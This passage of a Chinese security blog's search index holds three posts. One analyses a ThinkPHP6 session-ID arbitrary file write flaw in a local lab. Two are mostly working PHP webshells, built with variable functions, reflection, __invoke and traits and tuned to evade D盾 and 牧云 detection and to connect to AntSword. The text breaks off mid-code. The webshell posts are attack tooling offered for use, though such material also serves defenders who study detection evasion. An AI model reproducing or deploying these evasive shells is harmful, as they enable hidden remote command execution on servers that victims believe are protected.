<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ThinkPHP6任意文件操作漏洞分析</title>
    <url>/2020/01/26/ThinkPHP6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>这个洞出来也有一段时间了，看了创宇的paper后觉得蛮简单的，决定自己在本地搭建复现一下，记录一下学习的过程。</p>
<a id="more"></a>


<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>apache + thinphp(&lt;=6.0.0版本&lt;=6.0.2) + php7以上</p>
<ul>
<li>ThinkPHP6起只能使用composer来安装，安装composer、php、apache的过程我就不赘述了。<br>执行命令:<code>composer create-project topthink/think tp 6.0.0</code>，其中tp是你的文件夹命名，6.0.0是版本号，6.0.1也可。<br>这里说一个问题，我这个时间Thinkphp的最新版是6.0.2，用上面的命令下载下来framework是6.0.2版本的，我们需要再执行一条命令：<code>composer require topthink/framework:6.0.0</code>：此时就会把将6.0.0的版本把6.0.2给替换掉</li>
<li>进入tp的安装目录，执行<code>php think run</code>，它会开启一个临时的开发环境的服务器，默认运行在<code>localhost:8000</code>，打开浏览器访问显示正常即可<blockquote>
<p>漏洞复现在apache下进行</p>
</blockquote>
</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞影响的版本：top-think/framework 6.x &lt; 6.0.2</p>
<ul>
<li>官方信息<br>ThinkPHP发布的补丁声称修复了一处由于不安全的SessionId导致的任意文件操作漏洞：在开启Session的情况下可以导致创建任意文件以及删除任意文件，特定情况下可以getshell</li>
<li>根据这些信息，我们到官方GitHub的commit页面找一下相关的提交记录：<br><img src="github.png" alt="github"></li>
</ul>
<p>可以看到位于src/think/session/Store.php中212行在设置<code>id</code>时增加了一个函数：<code>ctype_alnum($text)</code>。<br>查一下PHP官方手册，这个函数是用来检测输入的<code>$text</code>中所有的字符全部是字母和(或者)数字，返回 TRUE 否则返回FALSE<br><img src="ctype_alnum.png" alt="ctype_alnum"></p>
<p>根据文件目录和更改的函数部分猜测：可能是存储Session时导致的文件写入；然后跟进找一下相关的函数，可以看到<code>vendor/topthink/framework/src/think/session/Store.php:254</code>的save()函数，265行还可以对文件进行删除操作，并且对后端业务逻辑依赖较低<br><img src="save.png" alt="save"></p>
<p>可以看到设置了$sessionId，并且调用了一个write函数，继续跟进，找到write()函数<code>vendor/topthink/framework/src/think/session/driver/File.php:210</code><br><img src="write.png" alt="write"></p>
<p>继续跟进，找到writeFile()函数<br><img src="writeFile.png" alt="writeFile"></p>
<p>可以看到调用了<code>file_put_contents()</code>函数，这里是真正写入文件的操作了<br><img src="file_put_contents.png" alt="file_put_contents"></p>
<ul>
<li>接下来我们反向分析一下，看看能不能找到可控点</li>
</ul>
<ol>
<li>函数<code>file_put_contents($path,$content,LOCK_EX)</code>中参数<code>$path,$content</code>来源于函数<code>writeFile($path,$data)</code></li>
<li>函数<code>writeFile($path,$data)</code>中参数<code>$path,$data</code>来源于函数<code>write(String $sessionID,String $sessiData)</code></li>
<li>函数<code>write(String $sessionID,String $sessiData)</code>中参数<code>$sessionID,$sessiData</code>来源于<code>save()</code>中调用了<code>write()</code>，同时传入的参数<code>$sessionId</code>的值是调用<code>getId()</code>传入的<br>综上：文件名来源于<code>$sessionId</code></li>
</ol>
<ul>
<li><p>当传入的id值长度为32并且……etc时，创建<code>sessionId</code>，然后进行<code>gitId()</code><br><img src="session.png" alt="session"></p>
</li>
<li><p>接下来找调用<code>setId()</code>的地方<code>vendor/topthink/framework/src/think/middleware/SessionInit.php:46</code><br><img src="sessionI.png" alt="sessionI"><br>其中<code>cookieName</code>的值为<code>PHPSESSID</code>，而<code>$sessionId</code>是<code>cookie</code>中名为<code>PHPSESSID</code>的值，因此是攻击者可控的，从而导致写入的文件名可控。<br>但是默认环境下，<code>session</code>的内容由<code>vendor/topthink/framework/src/think/session/Store.php:261</code>的变量<code>$data</code>传入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br></pre></td></tr></table></figure>
<p><code>$data</code>在默认环境中为空：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Session数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $data = [];</span><br></pre></td></tr></table></figure>
<p>写入的<code>session</code>内容是由实际的后端业务逻辑来决定的，所以说只有苛刻的条件下才能写入webshell。并且一开始就说了需要在环境开启<code>session</code>的情况下才可以实现任意文件操作(默认环境不开启session)</p>
</li>
<li><p>我们在<code>app\controller\index.php</code>中增加一些代码后，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Session</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Session::set(<span class="string">'name'</span>,<span class="string">'thinkphp'</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;style type="text/css"&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V6&lt;br/&gt;&lt;span style="font-size:30px"&gt;13载初心不改 - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;think id="eab4b9f840753f8e7"&gt;&lt;/think&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">($name = <span class="string">'ThinkPHP6'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'hello,'</span> . $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
</ul>
<blockquote>
<p>忘了说了thinkphp6开启session的方法：删除<code>/app/middleware.php</code>最后一行的注释<br><img src="kq.png" alt="kq"></p>
</blockquote>
<h1 id="本地环境复现"><a href="#本地环境复现" class="headerlink" title="本地环境复现"></a>本地环境复现</h1><p>很简单，只需要构造PHPSESSID的值即可，值为<code>string</code>&amp;&amp;长度为32<br><img src="tp.png" alt="tp"><br>此时查看一下生成的session，生成的session文件保存在<code>\runtime\session</code>下<br><img src="sessionphp.png" alt="sessionphp"><br>session里的内容:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:4:"name";s:8:"thinkphp";&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到session的内容经过了序列化操作，只要将session的内容反序列化即可getshell</p>
<ul>
<li>如果要getshell的话，后端需要有类似的<code>Session::Set(&#39;name&#39;,$_POST[&#39;i&#39;])</code>代码才可以利用</li>
</ul>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>在复现的过程，也遇到了不少问题：首先ThinkPHP6开始不支持git了，只能通过composer来操作，由于从来没用过它也没经验，一开始安装环境一直下载不到旧版本，后来得到师傅的帮助终于下好了ThinkPHP6.0.0的环境，在这里感谢一下师傅<a href="https://weibo.com/u/5332465356" target="_blank" rel="noopener">@P1an0</a>对我的帮助。<br>这个漏洞其实很简单，就是用户可控变量导致的，也没有对一些数据的过滤等等。需要一定条件才可以利用，也就是开启session；写webshell还要看具体的后端业务逻辑等等。我觉得就这个框架来看其实可以更深入的进行挖掘，希望有大佬可以和我一起探讨学习</p>
<p>参考的paper：<a href="https://paper.seebug.org/1114/" target="_blank" rel="noopener">ThinkPHP6 任意文件操作漏洞分析</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>ThinkPHP6</tag>
      </tags>
  </entry>
  <entry>
    <title>Webshell免杀的思考与学习</title>
    <url>/2020/08/17/Webshell%E5%85%8D%E6%9D%80%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>webshell</code>对于渗透测试者来说是既是一种结束也是一种开始；一个免杀的<code>webshell</code>是我们在渗透测试过程中能否拿到目标权限的一个“前提”，首先webshell需要落地存活，其次是否能够执行命令，最后我们使用webshell管理工具时流量是否被拦截。所以免杀至关重要。</p>
<a id="more"></a>
<h1 id="我的第一个一句话木马"><a href="#我的第一个一句话木马" class="headerlink" title="我的第一个一句话木马"></a>我的第一个一句话木马</h1><p>很奇怪，我学习安全接触的的第一个一句话木马就是它：<code>$_GET[1]($_POST[2]);</code>，并且令我印象深刻。当时不太理解这个是因为PHP太灵活了，没想到还有这种写法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">'assert'</span>;</span><br><span class="line">$a();</span><br></pre></td></tr></table></figure>
<p>这个木马和上面的例子一样，是一种可变函数，<code>$_GET[1]</code>写为字符串<code>assert</code>，<code>$_POST[2]</code>写为命令<code>phpinfo()</code>。</p>
<ul>
<li><p>值得一提的是assert和eval：<br>手册写到eval()不是一个函数而是一个语言构造器，所以不能被可变函数调用；eval() 把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，<strong>且必须以分号结尾</strong>。<br>而assert()是一个函数，所以它相比eval灵活许多，可以被可变函数调用，也可以被回调函数来调用。</p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>我们通过webshell执行命令，是通过我们可控的参数来达到目的，而上面的一句话木马我们可控的部分为POST和GET参数。只要稍作改变就可以绕过D盾的检测</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key =  $_value;</span><br><span class="line">        $_key($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="1.png" alt=""></p>
</li>
<li><p>可以看到这里并没有达到免杀效果</p>
</li>
</ul>
<p><img src="D1.png" alt=""></p>
<ul>
<li>接下来我又写了一个正常的类与函数，再次扫描发现D盾已经检测不出来了</li>
</ul>
<p><img src="D2.png" alt=""></p>
<hr>
<p>从可变函数的例子我们可以受到一些启发，通过翻阅PHP手册中的<strong>反射</strong>部分，我们可以得到一些可以利用的函数</p>
<h1 id="少见的函数"><a href="#少见的函数" class="headerlink" title="少见的函数"></a>少见的函数</h1><h2 id="获取注释"><a href="#获取注释" class="headerlink" title="获取注释"></a>获取注释</h2><p>PHP中有这样一个函数，它可以获取php注释的内容<br><code>public ReflectionClass::getDocComment( void) : string</code><br>某些查杀引擎在查杀的时候，会做类似于编译器的优化，去掉我们所写的注释。毕竟注释是不能运行的，如果我们将参数通过非常规的方式传输进来，这样或许可以绕过一些查杀引擎呢。我们知道，安全狗查形，D盾查参，就拿D盾来试一试。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* YXNzZXJ0YWE=</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fn</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$reflector = <span class="keyword">new</span> ReflectionClass(<span class="string">'Example'</span>);</span><br><span class="line"></span><br><span class="line">$zhushi = substr(($reflector-&gt;getDocComment()), <span class="number">7</span>, <span class="number">12</span>);</span><br><span class="line">$zhushi = base64_decode($zhushi);</span><br><span class="line">$zhushi = substr($zhushi, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">        print_r($$_request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$zhushi($_value);</span><br></pre></td></tr></table></figure>
<p><img src="D3.png" alt=""></p>
<h2 id="获取定义过的一个常量"><a href="#获取定义过的一个常量" class="headerlink" title="获取定义过的一个常量"></a>获取定义过的一个常量</h2><p><code>public ReflectionClass::getConstants(void) : array</code><br>获取某个类的全部已定义的常量，不管可见性如何定义。 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> a = <span class="string">'As'</span>;</span><br><span class="line">    <span class="keyword">const</span> b = <span class="string">'se'</span>;</span><br><span class="line">    <span class="keyword">const</span> c = <span class="string">'rt'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$para1;</span><br><span class="line">$para2;</span><br><span class="line">$reflector = <span class="keyword">new</span> ReflectionClass(<span class="string">'Test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">97</span>; $i &lt;= <span class="number">99</span>; $i++) &#123;</span><br><span class="line">    $para1 = $reflector-&gt;getConstant(chr($i));</span><br><span class="line">    $para2.=$para1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$para2($_value);</span><br></pre></td></tr></table></figure>
<p><img src="D4.png" alt=""></p>
<h2 id="获取一组常量"><a href="#获取一组常量" class="headerlink" title="获取一组常量"></a>获取一组常量</h2><p><code>public ReflectionClass::getConstants(void) : array</code><br>获取某个类的全部已定义的常量，不管可见性如何定义。 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> a = <span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">'aS'</span>,<span class="number">2</span>=&gt;<span class="string">'se'</span>,<span class="number">3</span>=&gt;<span class="string">'rT'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$refl = <span class="keyword">new</span> ReflectionClass(<span class="string">'Test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($refl-&gt;getConstants() <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key =&gt; $value1) &#123;</span><br><span class="line">        $value2.=$value1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$value2($_value);</span><br></pre></td></tr></table></figure>
<p><img src="D5.png" alt=""></p>
<h2 id="类与继承"><a href="#类与继承" class="headerlink" title="类与继承"></a>类与继承</h2><p>P牛的《PHP动态特性的捕捉与逃逸》中提到了一个点，</p>
<p><img src="php.png" alt=""></p>
<p>除了PPT里提到的trick，还能想到什么呢？</p>
<ul>
<li>面向对象中，类能够继承类的属性与方法。或许可以从这两个点入手，因为测试绕过了”牧云”，就暂时不放出来结果了。<br>至于为什么可以绕过：我的猜想是这个函数不在黑名单中，语法分析不够完善，引擎认为我们的vuln代码并不能执行。</li>
</ul>
<p><img src="result1.gif" alt=""></p>
<h2 id="创建类的实例"><a href="#创建类的实例" class="headerlink" title="创建类的实例"></a>创建类的实例</h2><p><code>public ReflectionClass::newInstance( mixed $args[, mixed $...] ) : object</code><br>简单地说，这个方法可以创建一个类的实例，同时该函数传递的参数会传递到该类的构造函数<br>需要注意的是，该方法传参和<code>call_user_func()</code>相似，不能使用引用类型传参，如果要使用引用类型使用另一个方法<code>newInstanceArgs</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($para)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//assert</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class1 = <span class="keyword">new</span> ReflectionClass(<span class="string">"Test1"</span>);</span><br><span class="line">$para = <span class="string">''</span>;</span><br><span class="line"><span class="comment">//可控的$para</span></span><br><span class="line">$class2 = $class1-&gt;newInstance($para);</span><br></pre></td></tr></table></figure>
<p>基本的框架就是这样了，对框架进行变形也可绕过”牧云”。</p>
<p><img src="result2.gif" alt=""></p>
]]></content>
      <categories>
        <category>Webshell</category>
      </categories>
      <tags>
        <tag>Webshell免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>Webshell免杀之蚁剑连接</title>
    <url>/2021/02/20/Webshell%E5%85%8D%E6%9D%80%E4%B9%8B%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继上一篇Webshell免杀已经过去很久了，之前的工作只是完成了落地免杀和命令的执行，如果我们直接传参进行命令执行的话会很容易被WAF拦截。蚁剑有编码器这一功能可以方便我们绕过WAF的检测。<br>后来一次使用webshell过程中发现其并不能连接蚁剑，决定抓包简单分析一下流量修改我们的webshell。</p>
<a id="more"></a>
<blockquote>
<p>本文首发于先知社区: <code>https://xz.aliyun.com/t/9218</code></p>
</blockquote>
<hr>
<h1 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h1><p>上一篇只是提到了php中大家比较少用的tricks，所以这一次分享几个之前总结的一些成果。</p>
<h2 id="ReflectionClass-newInstance"><a href="#ReflectionClass-newInstance" class="headerlink" title="ReflectionClass::newInstance"></a>ReflectionClass::newInstance</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($para, $_value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $para($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$class1 = <span class="keyword">new</span> ReflectionClass(<span class="string">"Test1"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>) <span class="keyword">as</span> $_r1) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_r1 <span class="keyword">as</span> $_asadasd=&gt;$_wfwefb) &#123;</span><br><span class="line">        </span><br><span class="line">                    $$_asadasd =$_wfwefb;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class2 = $class1-&gt;newInstance($_asadasd, $$_asadasd);</span><br></pre></td></tr></table></figure>
<p>我们首先初始化一个反射类，传入要实例化类的类名，接下来用<code>newInstance()</code>方法对该类进行实例化。</p>
<ol>
<li>我们的webshell需要接收两个参数，一个是<code>函数</code>，另一个是<code>函数的参数</code>，这里借用<code>@郑瀚AndrewHann</code>师傅的<a href="https://zhuanlan.zhihu.com/p/197553954" target="_blank" rel="noopener">污点传递理论</a><br><img src="%E6%B1%A1%E7%82%B9%E4%BC%A0%E9%80%92.png" alt="污点传递"></li>
<li>接下来就是在构造函数内部执行命令，执行命令的方式是使用可变函数。当函数名被传入<code>$para=assert</code>时，构造函数内变为<code>assert($_value)</code>。函数的参数即我们要执行的命令。</li>
<li>最后解决参数的传递。常见的<code>$_GET[]、$_POST[]、$_COOKIE[]...</code>数组无法直接使用。我们依然利用PHP的动态特性，使webshell不出现<code>$_GET[]、$_POST[]、$_COOKIE[]...</code>。当程序执行到第二个foreach循环之前。我们的输入并没有参数来接收，直到我们使用可变变量<code>变</code>出了<code>$_POST[]</code>，并将其键值进一步操作后传入<code>newInstance</code>函数。</li>
</ol>
<hr>
<p>上面这个webshell依然可以进行变形。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $para1 = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">private</span> $para2 = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">($para1, $para2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $para1($para2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($para1, $para2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>($para1, $para2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class1 = <span class="keyword">new</span> ReflectionClass(<span class="string">"Test1"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>) <span class="keyword">as</span> $_r1) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_r1 <span class="keyword">as</span> $_asadasd=&gt;$_wfwefb) &#123;</span><br><span class="line">        </span><br><span class="line">                    $$_asadasd =$_wfwefb;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class2 = $class1-&gt;newInstance($_asadasd, $$_asadasd);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>__invoke</code>：当尝试以调用函数的方式调用一个对象时，该方法会被自动调用。<br>所以我们在构造函数内调用一次对象：<code>$this($p1,$p2)</code>，接着会调用<code>__invoke()</code>函数实现命令执行。</li>
</ul>
<h2 id="trait-PHP-7"><a href="#trait-PHP-7" class="headerlink" title="trait(PHP 7)"></a>trait(PHP 7)</h2><p>php从以前到现在一直都是单继承的语言，无法同时从<strong>两个基类中继承属性和方法</strong>，为了解决这个问题，php出了<code>Trait</code>这个特性</p>
<ul>
<li>用法：通过在类中使用<code>use</code>关键字，声明要组合的Trait名称，具体的Trait的声明使用Trait关键词，<strong>Trait不能实例化</strong><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> Dog</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">"dog"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">drive</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"This is dog drive"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span><span class="params">($a, $b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $a($b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">drive</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"This is animal drive"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"This is animal eat"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Dog</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">drive</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"This is cat drive"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cat = <span class="keyword">new</span> Cat();</span><br><span class="line">$cat-&gt;eat($_key, $_value);</span><br></pre></td></tr></table></figure></li>
<li>我们的参数依旧将键值数组中的<code>键</code>、<code>值</code>分别传入。函数调用则使用PHP 7中的<code>trait</code>特性，最终实现可变函数的执行</li>
</ul>
<h2 id="静态调用非静态函数"><a href="#静态调用非静态函数" class="headerlink" title="静态调用非静态函数"></a>静态调用非静态函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleThis</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">NonStatic</span><span class="params">($p1, $p2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'6'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $p1($p2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line"> 